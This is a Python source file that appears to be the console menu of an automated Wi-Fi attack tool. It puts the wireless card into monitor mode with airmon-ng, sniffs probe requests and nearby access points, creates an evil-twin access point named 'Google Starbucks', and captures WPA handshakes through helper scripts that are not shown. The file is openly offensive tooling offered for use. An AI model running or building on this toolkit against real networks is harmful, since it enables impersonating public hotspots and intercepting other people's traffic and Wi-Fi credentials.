#===========================
# DEVLOPED BY SASO PAVLIC ||
#===========================
from scapy.all import *
from threading import Thread
#from faker import Faker
from sniffer import *
from APfaker import *
from menu import *
from consolemenu import *
from consolemenu.items import *
import subprocess
import time
from subprocess import Popen, PIPE
import shlex
from sniff_wifi import *


# This script needs to be executet with ROOT user!!! (Changing sys config files content (for ipv4 forwarding),
# changing wireless interface card mode,....)

inf_name = ""
global ascii_art 
ascii_art = """   _____      
            __              _   ______________
  / ___/____  ____ ______/ /_____ _____  / | / / ____/_  __/
  \__ \/ __ \/ __ `/ ___/ __/ __ `/ __ \/  |/ / __/   / /   
 ___/ / /_/ / /_/ / /  / /_/ /_/ / / / / /|  / /___  / /    
/____/ .___/\__,_/_/   \__/\__,_/_/ /_/_/ |_/_____/ /_/     
    /_/                                                     """


def run_command(command, print_out=True):
    process = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
    output = process.communicate()[0].strip()
    if print_out:
        print(output.decode("utf-8"))
    time.sleep(1)

def enable_monitor_mode():
    global inf_name

    print(f"Switching to monitor mode on {inf_name}...")
    run_command(f"sudo airmon-ng check kill;sudo airmon-ng start {inf_name};", False)
    inf_name = inf_name +"mon"

def disable_monitor_mode():
    global inf_name  

    print(f"Switching to managed mode on {inf_name}...")  
    run_command(f"""sudo airmon-ng stop {inf_name};
            sudo service NetworkManager stop;
            sudo service NetworkManager start;""", False)
    # Delete wireless interface card name postfix (wlan0mon -> wlan0)
    inf_name = inf_name[:-3]

def select_interface():
    global inf_name

    run_command("""ip link | awk -F: '$0 !~ "lo|vir|^[^0-9]"{print $2;getline}'""",True) 
    inf_name = input("Type wireless interface card name:")
    print(f"Selected wireless interface card is:{inf_name}")


def rename_interface():
    global inf_name
    print(f"Selected wireless interface card is:{inf_name}")
    new_name = input("Enter a new name for wireless interface card (default:wlan0):")
    run_command("sudo nmcli radio wifi off")
    run_command(f"sudo ip link set {inf_name} name {new_name}")
    run_command("sudo nmcli radio wifi on")

    inf_name = new_name
    print(f"New wireless interface card name is:{inf_name}")
    
def call_sniffer():
    start_sniffing(inf_name)


def run_command_test(command):
    # https://www.endpoint.com/blog/2015/01/28/getting-realtime-output-using-python
    process = subprocess.Popen(shlex.split(command), stdout=subprocess.PIPE)
    while True:
        output = process.stdout.readline()
        if output == '' and process.poll() is not None:
            break
        if output:
            print(output.strip())            
    rc = process.poll()
    return rc

def sniff_wifi():
    Popen(f"sudo gnome-terminal -x python sniff_wifi.py {inf_name}", stdout=PIPE, stderr=PIPE, stdin=PIPE, shell=True)
   
def call_capture_handshake(ssid_AP="c8:3a:35:17:15:40"):
    ssid_AP = input("Enter SSID for selected AP:")
    run_command_test(f'bash -c "source activate py2; python -V; python captureHandShake.py -C -e {ssid_AP} -o {ssid_AP}-handshake.cap {inf_name}"')
     

if __name__ == "__main__":

    # Create the menu
    menu = ConsoleMenu(ascii_art, "Automated Wi-Fi access point attack")   

    # Create some items    
    select_interface_item = FunctionItem("Select wireless interface card to work with (used for AP)", select_interface)

    rename_interface_item = FunctionItem("Rename wireless interface card name", rename_interface)

    enable_monitor_mode_item = FunctionItem("Enable monitor mode on selected interface", enable_monitor_mode)

    disable_monitor_mode_item = FunctionItem("Disable monitor mode on selected interface", disable_monitor_mode)

    sniffing_item = FunctionItem("Start sniffing probe requests", call_sniffer)

    evil_twin_item = FunctionItem("Create Evil-Twin AP", create_AP, ["Google Starbucks"])

    sniff_wifi_item = FunctionItem("Sniff Wi-Fi access points", sniff_wifi)

    capture_handshake_item = FunctionItem("Capture handshake", call_capture_handshake)

    menu.append_item(select_interface_item)
    menu.append_item(rename_interface_item)
    menu.append_item(enable_monitor_mode_item)
    menu.append_item(disable_monitor_mode_item)   
    menu.append_item(sniffing_item)
    menu.append_item(evil_twin_item)    
    menu.append_item(sniff_wifi_item)
    menu.append_item(capture_handshake_item)

    menu.show() 
    print("Application is closing...")    
    time.sleep(2) 